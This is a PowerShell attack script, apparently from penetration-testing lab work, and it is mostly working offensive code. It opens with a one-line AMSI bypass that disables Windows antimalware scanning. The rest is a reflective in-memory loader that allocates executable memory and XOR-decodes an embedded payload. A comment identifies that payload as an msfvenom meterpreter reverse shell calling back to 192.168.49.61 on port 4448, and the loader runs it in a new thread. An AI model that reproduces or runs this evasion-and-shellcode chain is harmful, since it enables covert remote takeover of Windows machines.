# Compact AMSI bypass
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like"*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
# Shellcode loader >:]
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}
function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}
# Allocate executable memory
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
# Copy shellcode to allocated memory
#[Byte[]] $buf = 
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.61 LPORT=4448 EXITFUNC=thread -f csharp
# xor-encoded with key 0xfa
[Byte[]] $buf =  
0x06,0xb2,0x79,0x1e,0x0a,0x12,0x36,0xfa,0xfa,0xfa,0xbb,0xab,0xbb,
0xaa,0xa8,0xab,0xb2,0xcb,0x28,0xac,0x9f,0xb2,0x71,0xa8,0x9a,0xb2,
0x71,0xa8,0xe2,0xb2,0x71,0xa8,0xda,0xb7,0xcb,0x33,0xb2,0x71,0x88,
0xaa,0xb2,0xf5,0x4d,0xb0,0xb0,0xb2,0xcb,0x3a,0x56,0xc6,0x9b,0x86,
0xf8,0xd6,0xda,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0x18,0x17,0xa8,
0xb2,0x71,0xa8,0xda,0xbb,0xab,0x71,0xb8,0xc6,0xb2,0xfb,0x2a,0x9c,
0x7b,0x82,0xe2,0xf1,0xf8,0xf5,0x7f,0x88,0xfa,0xfa,0xfa,0x71,0x7a,
0x72,0xfa,0xfa,0xfa,0xb2,0x7f,0x3a,0x8e,0x9d,0xb2,0xfb,0x2a,0xbe,
0x71,0xba,0xda,0xb3,0xfb,0x2a,0xaa,0x71,0xb2,0xe2,0x19,0xac,0xb2,
0x05,0x33,0xbb,0x71,0xce,0x72,0xb7,0xcb,0x33,0xb2,0xfb,0x2c,0xb2,
0xcb,0x3a,0xbb,0x3b,0x33,0xf7,0x56,0xbb,0xfb,0x3b,0xc2,0x1a,0x8f,
0x0b,0xb6,0xf9,0xb6,0xde,0xf2,0xbf,0xc3,0x2b,0x8f,0x22,0xa2,0xbe,
0x71,0xba,0xde,0xb3,0xfb,0x2a,0x9c,0xbb,0x71,0xf6,0xb2,0xbe,0x71,
0xba,0xe6,0xb3,0xfb,0x2a,0xbb,0x71,0xfe,0x72,0xbb,0xa2,0xb2,0xfb,
0x2a,0xbb,0xa2,0xa4,0xa3,0xa0,0xbb,0xa2,0xbb,0xa3,0xbb,0xa0,0xb2,
0x79,0x16,0xda,0xbb,0xa8,0x05,0x1a,0xa2,0xbb,0xa3,0xa0,0xb2,0x71,
0xe8,0x13,0xb1,0x05,0x05,0x05,0xa7,0xb3,0x44,0x8d,0x89,0xc8,0xa5,
0xc9,0xc8,0xfa,0xfa,0xbb,0xac,0xb3,0x73,0x1c,0xb2,0x7b,0x16,0x5a,
0xfb,0xfa,0xfa,0xb3,0x73,0x1f,0xb3,0x46,0xf8,0xfa,0xfb,0x41,0x55,
0xf6,0xaa,0xf6,0xbb,0xae,0xb3,0x73,0x1e,0xb6,0x73,0x0b,0xbb,0x40,
0xb6,0x8d,0xdc,0xfd,0x05,0x2f,0xb6,0x73,0x10,0x92,0xfb,0xfb,0xfa,
0xfa,0xa3,0xbb,0x40,0xd3,0x7a,0x91,0xfa,0x05,0x2f,0x90,0xf0,0xbb,
0xa4,0xaa,0xaa,0xb7,0xcb,0x33,0xb7,0xcb,0x3a,0xb2,0x05,0x3a,0xb2,
0x73,0x38,0xb2,0x05,0x3a,0xb2,0x73,0x3b,0xbb,0x40,0x10,0xf5,0x25,
0x1a,0x05,0x2f,0xb2,0x73,0x3d,0x90,0xea,0xbb,0xa2,0xb6,0x73,0x18,
0xb2,0x73,0x03,0xbb,0x40,0x63,0x5f,0x8e,0x9b,0x05,0x2f,0x7f,0x3a,
0x8e,0xf0,0xb3,0x05,0x34,0x8f,0x1f,0x12,0x69,0xfa,0xfa,0xfa,0xb2,
0x79,0x16,0xea,0xb2,0x73,0x18,0xb7,0xcb,0x33,0x90,0xfe,0xbb,0xa2,
0xb2,0x73,0x03,0xbb,0x40,0xf8,0x23,0x32,0xa5,0x05,0x2f,0x79,0x02,
0xfa,0x84,0xaf,0xb2,0x79,0x3e,0xda,0xa4,0x73,0x0c,0x90,0xba,0xbb,
0xa3,0x92,0xfa,0xea,0xfa,0xfa,0xbb,0xa2,0xb2,0x73,0x08,0xb2,0xcb,
0x33,0xbb,0x40,0xa2,0x5e,0xa9,0x1f,0x05,0x2f,0xb2,0x73,0x39,0xb3,
0x73,0x3d,0xb7,0xcb,0x33,0xb3,0x73,0x0a,0xb2,0x73,0x20,0xb2,0x73,
0x03,0xbb,0x40,0xf8,0x23,0x32,0xa5,0x05,0x2f,0x79,0x02,0xfa,0x87,
0xd2,0xa2,0xbb,0xad,0xa3,0x92,0xfa,0xba,0xfa,0xfa,0xbb,0xa2,0x90,
0xfa,0xa0,0xbb,0x40,0xf1,0xd5,0xf5,0xca,0x05,0x2f,0xad,0xa3,0xbb,
0x40,0x8f,0x94,0xb7,0x9b,0x05,0x2f,0xb3,0x05,0x34,0x13,0xc6,0x05,
0x05,0x05,0xb2,0xfb,0x39,0xb2,0xd3,0x3c,0xb2,0x7f,0x0c,0x8f,0x4e,
0xbb,0x05,0x1d,0xa2,0x90,0xfa,0xa3,0x41,0x1a,0xe7,0xd0,0xf0,0xbb,
0x73,0x20,0x05,0x2f


$key = "0xfa";
for($i=0; $i -lt $buf.length; $i++)
{
  $buf[$i] = $buf[$i] -bxor $key
}

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
# Execute shellcode and wait for it to exit
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),
  (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),
  (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
